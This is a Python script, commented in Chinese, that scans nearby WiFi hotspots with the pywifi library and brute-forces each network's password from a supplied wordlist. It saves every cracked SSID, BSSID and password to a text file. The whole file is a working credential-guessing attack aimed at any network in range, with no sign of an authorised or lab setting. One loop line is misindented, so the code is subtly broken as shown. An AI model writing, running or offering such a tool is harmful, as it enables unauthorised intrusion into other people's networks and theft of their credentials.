from pywifi import *
import time
import sys

def main():
    scantimes = 3
    testtimes = 15
    output = sys.stdout
    files ="Test_wifi.txt"
    keys = open(sys.argv[1],"r").readlines()
    print("|KEYS %s"%(len(keys)))
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    scanres =scans(iface,scantimes)
    nums = len(scanres)
    print ("|SCAN GET %s"%(nums))
    print ("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s"%("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70))
    #将每一个热点信息逐一进行测试
     for i,x in enumerate(scanres):
        #测试完毕后，成功的结果讲存储到files中
        res = test(nums-i,iface,x,keys,output,testtimes)
        if res:
            open(files,"a").write(res)
def scans(face,timeout):
    #开始扫描
    face.scan()
    time.sleep(timeout)
    #在若干秒后获取扫描结果
    return face.scan_results()
def test(i,face,x,key,stu,ts):
    #显示对应网络名称，考虑到部分中文名啧显示bssid
    showID = x.bssid if len(x.ssid)>len(x.bssid) else x.ssid
    #迭代字典并进行爆破
    for n,k in enumerate(key):
        x.key = k.strip()
        #移除所有热点配置
        face.remove_all_network_profiles()
        #讲封装好的目标尝试连接
        face.connect(face.add_network_profile(x))
        #初始化状态码，考虑到用0会发生些逻辑错误
        code = 10
        t1 = time.time()
        #循环刷新状态，如果置为0则密码错误，如超时则进行下一个
        while code!=0 :
            time.sleep(0.1)
            code = face.status()
            now = time.time()-t1
            if now>ts:
                break
            stu.write("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s"%(6,i,18,showID,code,5,now,7,x.signal,10,len(key)-n,10,k.replace("\n","")))
            stu.flush()
            if code == 4:
                face.disconnect()
                return "%-*s| %s | %*s |%*s\n"%(20,x.ssid,x.bssid,3,x.signal,15,k)
    return False
